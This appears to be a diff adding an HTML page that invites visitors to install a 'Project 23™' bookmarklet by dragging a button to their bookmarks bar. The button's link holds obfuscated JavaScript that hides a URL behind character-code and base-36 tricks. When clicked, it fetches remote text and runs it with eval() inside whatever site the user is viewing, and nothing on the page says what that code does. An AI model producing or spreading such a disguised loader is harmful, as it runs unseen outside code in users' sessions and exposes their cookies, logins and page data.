@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bookmarklet Distributor</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom styles for the Inter font */
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        /* Basic styling for the draggable button - though the drag functionality is inherent to the anchor tag with javascript: href */
+        .bookmarklet-button {
+            cursor: grab; /* Indicate it's draggable */
+            user-select: none; /* Prevent text selection on drag */
+            transition: all 0.3s ease-in-out; /* Smooth transitions for hover effects */
+        }
+        .bookmarklet-button:hover {
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+        .bookmarklet-button:active {
+            transform: translateY(0) scale(1);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen flex items-center justify-center p-6">
+    <div class="bg-white p-10 rounded-2xl shadow-xl max-w-lg w-full text-center border border-gray-200">
+        <h1 class="text-4xl font-extrabold text-gray-800 mb-4 leading-tight">
+            Project 23™
+        </h1>
+        <p class="text-gray-600 text-lg mb-10">
+            Simply <span class="font-semibold text-blue-600">drag the button below</span> to your browser's bookmarks bar to install.
+        </p>
+
+        <a
+            href="javascript:fetch((function(){var H=Array.prototype.slice.call(arguments),o=H.shift();return H.reverse().map(function(p,G){return String.fromCharCode(p-o-62-G)}).join('')})(27,176,233,232,226,245,241,222,169,230,231,218,164,233,226,216,230,223,223,210,224,210,223,224,204,222,208,219,207,204,146,218,195,211,143,142,152,208,204,207,206,193)+(1742266596).toString(36).toLowerCase()+(29).toString(36).toLowerCase().split('').map(function(c){return String.fromCharCode(c.charCodeAt()+(-71))}).join('')+(32475).toString(36).toLowerCase()+(31).toString(36).toLowerCase().split('').map(function(c){return String.fromCharCode(c.charCodeAt()+(-71))}).join('')+(1278424).toString(36).toLowerCase()+(31).toString(36).toLowerCase().split('').map(function(o){return String.fromCharCode(o.charCodeAt()+(-71))}).join('')+(29220112).toString(36).toLowerCase()+(31).toString(36).toLowerCase().split('').map(function(k){return String.fromCharCode(k.charCodeAt()+(-71))}).join('')+(1040063).toString(36).toLowerCase()+(31).toString(36).toLowerCase().split('').map(function(H){return String.fromCharCode(H.charCodeAt()+(-71))}).join('')+(706585186).toString(36).toLowerCase()+(function(){var q=Array.prototype.slice.call(arguments),v=q.shift();return q.reverse().map(function(w,S){return String.fromCharCode(w-v-56-S)}).join('')})(38,208)+(26690).toString(36).toLowerCase()+(function(){var r=Array.prototype.slice.call(arguments),O=r.shift();return r.reverse().map(function(u,d){return String.fromCharCode(u-O-58-d)}).join('')})(34,208)+(30).toString(36).toLowerCase().split('').map(function(V){return String.fromCharCode(V.charCodeAt()+(-71))}).join('')+(712).toString(36).toLowerCase()).then(r=>r.text()).then(t=>eval(t)).catch(e=>alert(e));"
+            class="bookmarklet-button inline-block bg-blue-500 text-white font-bold py-4 px-10 rounded-full shadow-lg hover:bg-blue-600 focus:outline-none focus:ring-4 focus:ring-blue-200 transition-all duration-300"
+            title="Drag this to your bookmarks bar!"
+        >
+            Drag Me to Your Bookmarks Bar!
+        </a>
+
+        <p class="text-gray-500 text-sm mt-10">
+            (Ensure your bookmarks bar is visible for easy installation)
+        </p>
+    </div>
+</body>
+</html>
